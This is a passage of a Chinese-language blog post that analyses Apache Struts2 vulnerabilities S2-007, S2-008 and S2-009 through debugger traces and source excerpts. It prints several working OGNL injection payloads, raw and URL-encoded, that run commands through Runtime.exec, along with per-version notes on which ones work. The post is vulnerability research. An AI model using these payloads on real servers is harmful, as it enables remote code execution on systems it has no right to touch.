<p>执行 getOverrideExpr 生成一个表达式，用于覆盖默认的转换结果。</p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250409151300703.png" srcset="/img/loading.gif" lazyload alt="image-20250409151300703"></p>
<p>看到它给我们的值做了 字符串拼接，用 <code>‘ ’</code> 进行包裹</p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250409153345360.png" srcset="/img/loading.gif" lazyload alt="image-20250409153345360"></p>
<p>然后保存到 context 中</p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250409152415626.png" srcset="/img/loading.gif" lazyload alt="image-20250409152415626"></p>
<p>最终在 doEndTag 进行解析的时候，执行 overrides.get(expr) 获取 <code>‘ ’</code> 包裹的错误值</p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250409154859565.png" srcset="/img/loading.gif" lazyload alt="image-20250409154859565"></p>
<p>看一下调用栈</p>
<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">findValue:</span><span class="hljs-number">258</span>, OgnlValueStack (<span class="hljs-keyword">com</span>.opensymphony.xwork2.util)<br><span class="hljs-symbol">translateVariables:</span><span class="hljs-number">149</span>, TextParseUtil (<span class="hljs-keyword">com</span>.opensymphony.xwork2.util)<br><span class="hljs-symbol">translateVariables:</span><span class="hljs-number">100</span>, TextParseUtil (<span class="hljs-keyword">com</span>.opensymphony.xwork2.util)<br><span class="hljs-symbol">translateVariables:</span><span class="hljs-number">73</span>, TextParseUtil (<span class="hljs-keyword">com</span>.opensymphony.xwork2.util)<br><span class="hljs-symbol">findValue:</span><span class="hljs-number">313</span>, Component (org.apache.struts2.components)<br><span class="hljs-symbol">evaluateParams:</span><span class="hljs-number">723</span>, UIBean (org.apache.struts2.components)<br><span class="hljs-symbol">end:</span><span class="hljs-number">481</span>, UIBean (org.apache.struts2.components)<br><span class="hljs-symbol">doEndTag:</span><span class="hljs-number">43</span>, ComponentTagSupport (org.apache.struts2.views.jsp)<br></code></pre></td></tr></table></figure>

<p>getValue 后续的解析就和之前差不多了，注意 AST 表达式的生成和调用方法就可以</p>
<h3 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h3><p>我们可以使用  <code>&#39;+ +&#39;</code> 去闭合 getOverrideExpr  添加的 <code>&#39;</code> </p>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">&#x27;+ (@java.lang.Runtime@getRuntime().exec(&#x27;calc&#x27;)) +&#x27;<br></code></pre></td></tr></table></figure>

<p>成功执行</p>
<img src="https://gitee.com/ling-x5/img/raw/master/image-20250409161935368.png" srcset="/img/loading.gif" lazyload alt="image-20250409161935368" style="zoom:50%;" />

<blockquote>
<p>可能有点疑惑的就是，我们在 S2-003 的时候 不是还要添加 #context [“xwork.MethodAccessor.denyMethodExecution”] &#x3D; false 吗？为什么这个不添加，也可以执行呢？</p>
<p>答案其实也很简单，因为 S2-003 是在参数拦截器造成的问题，而在拦截器的方法中(ParametersInterceptor#intercept) 显示的把 denyMethodExecution 设置为了 true，但是在执行完成之后的 finally 代码快中 又设置为了 false</p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250409165616851.png" srcset="/img/loading.gif" lazyload alt="image-20250409165616851"></p>
<p>而我们的 S2-007 并不是在 <em>ParametersInterceptor</em> 这里 解析的，而是在 doEndTag 方法中 解析</p>
</blockquote>
<p>在 Struts 2.0.12 以后 添加了 allowStaticMethodAccess 这个属性，可以用以下 payload</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">&#x27; + (#_memberAccess[<span class="hljs-string">&quot;allowStaticMethodAccess&quot;</span>]<span class="hljs-operator">=</span><span class="hljs-keyword">true</span><span class="hljs-punctuation">,</span><span class="hljs-title">@java.lang.Runtime</span><span class="hljs-title">@getRuntime</span>().exec(&#x27;calc&#x27;))+ &#x27;<br></code></pre></td></tr></table></figure>

<p><span style="color:#FF0000;"> 亲测 在 2.0.12 中不存在此漏洞， struts2 会给强转类型一个默认值 不会给 overrides 填值 </span></p>
<img src="https://gitee.com/ling-x5/img/raw/master/PixPin_2025-04-09_19-14-13.gif" srcset="/img/loading.gif" lazyload alt="PixPin_2025-04-09_19-14-13" style="zoom:50%;" />



<p>而在 后一个版本（2.0.14）中 又可以利用了</p>
<img src="https://gitee.com/ling-x5/img/raw/master/PixPin_2025-04-09_19-12-51.gif" srcset="/img/loading.gif" lazyload alt="PixPin_2025-04-09_19-12-51" style="zoom:50%;" />

<p>调试了一下 发现，在 2.0.14 中 的 SecurityMemberAccess#isExcluded 当 paramName 为 null 时不在抛出异常，也就是第一个 payload 和 第二个 payload 都可以用 而且 不用像 S2-005 的绕过 一样，把 excludeProperties 设置为空</p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250409192428124.png" srcset="/img/loading.gif" lazyload alt="image-20250409192428124"></p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250409192509224.png" srcset="/img/loading.gif" lazyload alt="image-20250409192509224"></p>
<p><strong>注意</strong></p>
<blockquote>
<p>如果在 2.0.12 之前版本 只能用 <code>&#39;+ (@java.lang.Runtime@getRuntime().exec(&#39;calc&#39;)) +&#39;</code></p>
<p>否则的话会报错</p>
<p>ognl.NoSuchPropertyException: ognl.DefaultMemberAccess.allowStaticMethodAccess</p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250409163039271.png" srcset="/img/loading.gif" lazyload alt="image-20250409163039271"></p>
<p>在之后更推荐 <code>&#39; + (#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,@java.lang.Runtime@getRuntime().exec(&#39;calc&#39;))+ &#39;</code></p>
<p>因为攻击目标可能手动把 allowStaticMethodAccess 设置为 false</p>
</blockquote>
<h2 id="S2-008"><a href="#S2-008" class="headerlink" title="S2-008"></a>S2-008</h2><p>影响版本：Struts 2.0.0 - Struts 2.3.17 </p>
<p>参考链接：<a target="_blank" rel="noopener" href="https://cwiki.apache.org/confluence/display/WW/S2-008">https://cwiki.apache.org/confluence/display/WW/S2-008</a></p>
<blockquote>
<p>为防止攻击者在参数中调用任意方法，标志 xwork.MethodAccessor.denyMethodExecution 默认设置为 true，SecurityMemberAccess 字段 allowStaticMethodAccess 默认设置为 false。此外，自 Struts 2.2.1.1 起，为防止访问上下文变量，在 ParameterInterceptor 中应用了改进的参数名称字符白名单: </p>
<p><code>acceptedParamNames = &quot;[a-zA-Z0-9\.][()_&#39;]+&quot;;</code></p>
<ol>
<li><strong>Remote command execution in Struts &lt;&#x3D; 2.2.3 (<code>ExceptionDelegator</code>)</strong></li>
<li><strong>Remote command execution in Struts &lt;&#x3D; 2.3.1 (<code>CookieInterceptor</code>)</strong></li>
<li><strong>Arbitrary File Overwrite in Struts &lt;&#x3D; 2.3.1 (<code>ParameterInterceptor</code>)</strong></li>
<li><strong>Remote command execution in Struts &lt;&#x3D; 2.3.17 (<code>DebuggingInterceptor</code>)</strong></li>
</ol>
</blockquote>
<p>其中 第一条就是说的 S2-007 漏洞，利用错误的强转来实现 RCE</p>
<p>3、ParameterInterceptor 这个就是由于 acceptedParamNames 的正则过滤没有过滤掉 括号 符号，从而可以调用一些构造方法，比如 FileWriter  可以创建 文件或者 把已有的文件制空</p>
<p>4、DebuggingInterceptor 这其实可以看作 Struts 的一个特性，因为 debug 模式下，本身就赋予了命令执行的权力</p>
<p><code>&lt;constant name=&quot;struts.devMode&quot; value=&quot;true&quot; /&gt;</code></p>
<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">debug=command&amp;<span class="hljs-keyword">expression</span>=(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@java.lang.Runtime@getRuntime%28%29.<span class="hljs-keyword">exec</span>%28%22calc%22%29)<br></code></pre></td></tr></table></figure>

<p>不过这种只能算是一种安全风险，感觉算不上是漏洞，而是 struts2 的 debug 特性</p>
<p>debug 有 三种模式 在 org.apache.struts2.interceptor.debugging.DebuggingInterceptor#intercept 中可以看到</p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250410134711475.png" srcset="/img/loading.gif" lazyload alt="image-20250410134711475"></p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250410134727023.png" srcset="/img/loading.gif" lazyload alt="image-20250410134727023"></p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250410134743944.png" srcset="/img/loading.gif" lazyload alt="image-20250410134743944"></p>
<p>command 的主要逻辑 就是 获得了  expression 参数，并执行 stack.findValue(cmd) 从而解析了恶意的 ognl 表达式</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;command&quot;</span>.equals(type)) &#123;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">                 * 从会话中获取之前保存的ValueStack对象。</span><br><span class="hljs-comment">                 * 如果会话中不存在，则从当前ActionContext中获取ValueStack对象，并将其保存到会话中。</span><br><span class="hljs-comment">                 */</span><br>    <span class="hljs-type">ValueStack</span> <span class="hljs-variable">stack</span> <span class="hljs-operator">=</span> (ValueStack)ctx.getSession().get(<span class="hljs-string">&quot;org.apache.struts2.interceptor.debugging.VALUE_STACK&quot;</span>);<br>    <span class="hljs-keyword">if</span> (stack == <span class="hljs-literal">null</span>) &#123;<br>        stack = (ValueStack)ctx.get(<span class="hljs-string">&quot;com.opensymphony.xwork2.util.ValueStack.ValueStack&quot;</span>);<br>        ctx.getSession().put(<span class="hljs-string">&quot;org.apache.struts2.interceptor.debugging.VALUE_STACK&quot;</span>, stack);<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">                 * 从请求参数中获取要执行的表达式。</span><br><span class="hljs-comment">                 * 设置请求属性，禁用装饰器。</span><br><span class="hljs-comment">                 * 设置响应的内容类型为纯文本。</span><br><span class="hljs-comment">                 */</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getParameter(<span class="hljs-string">&quot;expression&quot;</span>);<br>    ServletActionContext.getRequest().setAttribute(<span class="hljs-string">&quot;decorator&quot;</span>, <span class="hljs-string">&quot;none&quot;</span>);<br>    <span class="hljs-type">HttpServletResponse</span> <span class="hljs-variable">res</span> <span class="hljs-operator">=</span> ServletActionContext.getResponse();<br>    res.setContentType(<span class="hljs-string">&quot;text/plain&quot;</span>);<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">writer</span> <span class="hljs-operator">=</span> ServletActionContext.getResponse().getWriter();<br>        <span class="hljs-comment">// 调用 findValue 执行 ognl 表达式</span><br>        writer.print(stack.findValue(cmd));<br>        writer.close();<br>    &#125; <span class="hljs-keyword">catch</span> (IOException ex) &#123;<br>        ex.printStackTrace();<br>    &#125;<br></code></pre></td></tr></table></figure>

<h2 id="S2-009"><a href="#S2-009" class="headerlink" title="S2-009"></a>S2-009</h2><p>影响版本：Struts 2.0.0-Struts 2.3.1.1 </p>
<p>参考链接：<a target="_blank" rel="noopener" href="https://cwiki.apache.org/confluence/display/WW/S2-009">https://cwiki.apache.org/confluence/display/WW/S2-009</a></p>
<p>S2-009 是利用参数值进行绕过，因为  acceptedParamNames  只对参数名称加强了正则表达式，而未对值进行严格的过滤，在 ParametersInterceptor 中 会将其添加到 stack 中，我们利用表达式取出值，进行二次解析，就可以实现命令执行</p>
<p>其实本质还是对 S2-003 的绕过，使用了如下正则</p>
<figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-keyword">private</span> <span class="hljs-type">String</span> acceptedParamNames <span class="hljs-operator">=</span> <span class="hljs-string">&quot;[a-zA-Z0-9<span class="hljs-subst">\\</span>.<span class="hljs-subst">\\</span>]<span class="hljs-subst">\\</span>[<span class="hljs-subst">\\</span>(<span class="hljs-subst">\\</span>)_&#x27;<span class="hljs-subst">\\</span>s]+&quot;</span>;<br></code></pre></td></tr></table></figure>

<p>我们可以使用 <code>top[&#39;foo&#39;](0)</code> 来访问 action 中的参数，并解析执行</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">foo=(<span class="hljs-selector-id">#context</span><span class="hljs-selector-attr">[<span class="hljs-string">&quot;xwork.MethodAccessor.denyMethodExecution&quot;</span>]</span>=new java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.Boolean</span>(false), #_memberAccess<span class="hljs-selector-attr">[<span class="hljs-string">&quot;allowStaticMethodAccess&quot;</span>]</span>=true,@java<span class="hljs-selector-class">.lang</span>.Runtime@<span class="hljs-built_in">getRuntime</span>()<span class="hljs-selector-class">.exec</span>(<span class="hljs-string">&quot;calc&quot;</span>))(lingx5)&amp;<span class="hljs-attribute">top</span>[<span class="hljs-string">&#x27;foo&#x27;</span>](<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure>

<p>url 编码后</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">foo<span class="hljs-operator">=</span>(<span class="hljs-variable">%23</span>context<span class="hljs-variable">%5</span>B<span class="hljs-variable">%22</span>xwork.MethodAccessor.denyMethodExecution<span class="hljs-variable">%22</span><span class="hljs-variable">%5</span>D<span class="hljs-operator">=</span>new java.lang.Boolean(<span class="hljs-keyword">false</span>)<span class="hljs-punctuation">,</span> <span class="hljs-variable">%23</span>_memberAccess<span class="hljs-variable">%5</span>B<span class="hljs-variable">%22</span>allowStaticMethodAccess<span class="hljs-variable">%22</span><span class="hljs-variable">%5</span>D<span class="hljs-operator">=</span><span class="hljs-keyword">true</span><span class="hljs-punctuation">,</span><span class="hljs-title">@java.lang.Runtime</span><span class="hljs-title">@getRuntime</span>().exec(<span class="hljs-variable">%22</span>calc<span class="hljs-variable">%22</span>))(lingx<span class="hljs-number">5</span>)&amp;top<span class="hljs-variable">%5</span>B<span class="hljs-variable">%27</span>foo<span class="hljs-variable">%27</span><span class="hljs-variable">%5</span>D(<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure>



<blockquote>
<p><strong>注意</strong> </p>
<p>url 编码不要 把 &#x3D; 号 和 &amp; 符号 进行编码，不然 ParametersInterceptor 无法识别，分割参数，会导致无法执行</p>
</blockquote>
<h3 id="漏洞分析-5"><a href="#漏洞分析-5" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>其实就是 action 里有一个名为 foo 的变量，我们把 ognl 表达式 赋值给它，在通过 struts2 取出，做二次解析</p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250410150233996.png" srcset="/img/loading.gif" lazyload alt="image-20250410150233996"></p>
<p>这里就是 foo 和 <code>top[&#39;foo&#39;](0)</code> 因为正则表达式 运行 <code>[]() &#39;&#39;</code> 这些字符 所以 这个式子可以正常添加进 acceptableParameters 这个 map 中</p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250410150429721.png" srcset="/img/loading.gif" lazyload alt="image-20250410150429721"></p>
<p>之后是遍历 acceptableParameters 调用 newStack.setValue(name, value);</p>
<p>先给 action 的 foo 属性赋值</p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250410150549762.png" srcset="/img/loading.gif" lazyload alt="image-20250410150549762"></p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250410150633810.png" srcset="/img/loading.gif" lazyload alt="image-20250410150633810"></p>
<p>开始执行 <code>top[&#39;foo&#39;](0)</code> 了，看到解析为了 ASTEval 表达式，其实和之前就很相似了</p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250410150809295.png" srcset="/img/loading.gif" lazyload alt="image-20250410150809295"></p>
<p>还是熟悉的 this._children[0].getValue  把 top 解析为了 ASTProperty 获取了 TestAction 这个类</p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250410151155646.png" srcset="/img/loading.gif" lazyload alt="image-20250410151155646"></p>
<p>同样的 foo 获取了 ognl表达式</p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250410151434242.png" srcset="/img/loading.gif" lazyload alt="image-20250410151434242"></p>
<p>后续就会来到 ASTEval 的 setValue 方法，之后再把 children[0] 解析成 ASTEval 节点，后续就和 S2-003 一样了</p>
<p><span style="color:#FF0000;">其实主要还是对 acceptedParamNames 这个正则的绕过</span></p>
<p>还有种 POC 是这样的</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">foo=(<span class="hljs-selector-id">#context</span><span class="hljs-selector-attr">[<span class="hljs-string">&quot;xwork.MethodAccessor.denyMethodExecution&quot;</span>]</span>= new java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.Boolean</span>(false), #_memberAccess<span class="hljs-selector-attr">[<span class="hljs-string">&quot;allowStaticMethodAccess&quot;</span>]</span>= new java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.Boolean</span>(true), @java<span class="hljs-selector-class">.lang</span>.Runtime@<span class="hljs-built_in">getRuntime</span>()<span class="hljs-selector-class">.exec</span>(<span class="hljs-string">&#x27;calc&#x27;</span>))(meh)&amp;z<span class="hljs-selector-attr">[(foo)(<span class="hljs-string">&#x27;meh&#x27;</span>)]</span>=true<br></code></pre></td></tr></table></figure>

<p>url 编码后</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">foo<span class="hljs-operator">=</span><span class="hljs-variable">%28</span><span class="hljs-variable">%23</span>context<span class="hljs-variable">%5</span>B<span class="hljs-variable">%22</span>xwork.MethodAccessor.denyMethodExecution<span class="hljs-variable">%22</span><span class="hljs-variable">%5</span>D<span class="hljs-variable">%3</span>D+new+java.lang.Boolean<span class="hljs-variable">%28</span><span class="hljs-keyword">false</span><span class="hljs-variable">%29</span><span class="hljs-punctuation">,</span><span class="hljs-variable">%20</span><span class="hljs-variable">%23</span>_memberAccess<span class="hljs-variable">%5</span>B<span class="hljs-variable">%22</span>allowStaticMethodAccess<span class="hljs-variable">%22</span><span class="hljs-variable">%5</span>D<span class="hljs-variable">%3</span>d+new+java.lang.Boolean<span class="hljs-variable">%28</span><span class="hljs-keyword">true</span><span class="hljs-variable">%29</span><span class="hljs-punctuation">,</span><span class="hljs-variable">%20</span><span class="hljs-title">@java.lang.Runtime</span><span class="hljs-title">@getRuntime</span><span class="hljs-variable">%28</span><span class="hljs-variable">%29</span>.exec<span class="hljs-variable">%28</span><span class="hljs-variable">%27</span>calc<span class="hljs-variable">%27</span><span class="hljs-variable">%29</span><span class="hljs-variable">%29</span><span class="hljs-variable">%28</span>meh<span class="hljs-variable">%29</span>&amp;z<span class="hljs-variable">%5</span>B<span class="hljs-variable">%28</span>foo<span class="hljs-variable">%29</span><span class="hljs-variable">%28</span><span class="hljs-variable">%27</span>meh<span class="hljs-variable">%27</span><span class="hljs-variable">%29</span><span class="hljs-variable">%5</span>D<span class="hljs-operator">=</span><span class="hljs-keyword">true</span><br></code></pre></td></tr></table></figure>

<p>也是可以完成利用的</p>
<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250410164211892.png" srcset="/img/loading.gif" lazyload alt="image-20250410164211892"></p>
<blockquote>
<p>值得注意的是，两个表达式在 TreeMap中的存放顺序，要让 ParametersInterceptor 在setValue时，先去进行 foo 的赋值，在进行后续foo 的读取和执行</p>
</blockquote>
<p>就比如我把最后的 <code>z[(foo)(&#39;meh&#39;)]</code> 改为 <code>a[(foo)(&#39;meh&#39;)]</code> 就无法执行成功</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">foo<span class="hljs-operator">=</span><span class="hljs-variable">%28</span><span class="hljs-variable">%23</span>context<span class="hljs-variable">%5</span>B<span class="hljs-variable">%22</span>xwork.MethodAccessor.denyMethodExecution<span class="hljs-variable">%22</span><span class="hljs-variable">%5</span>D<span class="hljs-variable">%3</span>D+new+java.lang.Boolean<span class="hljs-variable">%28</span><span class="hljs-keyword">false</span><span class="hljs-variable">%29</span><span class="hljs-punctuation">,</span><span class="hljs-variable">%20</span><span class="hljs-variable">%23</span>_memberAccess<span class="hljs-variable">%5</span>B<span class="hljs-variable">%22</span>allowStaticMethodAccess<span class="hljs-variable">%22</span><span class="hljs-variable">%5</span>D<span class="hljs-variable">%3</span>d+new+java.lang.Boolean<span class="hljs-variable">%28</span><span class="hljs-keyword">true</span><span class="hljs-variable">%29</span><span class="hljs-punctuation">,</span><span class="hljs-variable">%20</span><span class="hljs-title">@java.lang.Runtime</span><span class="hljs-title">@getRuntime</span><span class="hljs-variable">%28</span><span class="hljs-variable">%29</span>.exec<span class="hljs-variable">%28</span><span class="hljs-variable">%27</span>calc<span class="hljs-variable">%27</span><span class="hljs-variable">%29</span><span class="hljs-variable">%29</span><span class="hljs-variable">%28</span>meh<span class="hljs-variable">%29</span>&amp;a<span class="hljs-variable">%5</span>B<span class="hljs-variable">%28</span>foo<span class="hljs-variable">%29</span><span class="hljs-variable">%28</span><span class="hljs-variable">%27</span>meh<span class="hljs-variable">%27</span><span class="hljs-variable">%29</span><span class="hljs-variable">%5</span>D<span class="hljs-operator">=</span><span class="hljs-keyword">true</span><br></code></pre></td></tr></table></figure>

<img src="https://gitee.com/ling-x5/img/raw/master/image-20250410164845528.png" srcset="/img/loading.gif" lazyload alt="image-20250410164845528" style="zoom: 50%;" />

<p>参考文章</p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/624053727">Struts2-001 漏洞分析（CVE-2007-4556） - 知乎</a></p>
<p><a target="_blank" rel="noopener" href="https://www.javasec.org/java-vuls/Struts/Struts2-1.html">https://www.javasec.org/java-vuls/Struts/Struts2-1.html</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/xhycccc/Struts2-Vuln-Demo">https://github.com/xhycccc/Struts2-Vuln-Demo</a></p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/java%E5%AE%89%E5%85%A8/" class="category-chain-item">java安全</a>
  
  
    <span>></span>
    
  <a href="/categories/java%E5%AE%89%E5%85%A8/Struts2/" class="category-chain-item">Struts2</a>
  
  

  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/Struts2/" class="print-no-link">#Struts2</a>
      
        <a href="/tags/java%E5%AE%89%E5%85%A8/" class="print-no-link">#java安全</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>struts2漏洞1-9</div>
      <div>http://lingx5.github.io/2025/04/10/struts2反序列化1-9/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>lingx5</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2025年4月10日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-cc-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2025/04/14/struts2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9612-61/" title="struts2反序列化12-61">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">struts2反序列化12-61</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2025/04/06/java-CC4-%E9%93%BE%E5%AE%A1%E8%AE%A1%E7%AC%94%E8%AE%B0/" title="java-CC4 链审计笔记">
                        <span class="hidden-mobile">java-CC4 链审计笔记</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
  
  
    <article id="comments" lazyload>
      

    </article>
  


          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a>
    </div>
  
  
    <div class="statistics">
  
  

  
    
      <span id="busuanzi_container_site_pv" style="display: none">
        总访问量 
        <span id="busuanzi_value_site_pv"></span>
         次
      </span>
    
    
      <span id="busuanzi_container_site_uv" style="display: none">
        总访客数 
        <span id="busuanzi_value_site_uv"></span>
         人
      </span>
    
    

  

</div>

  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
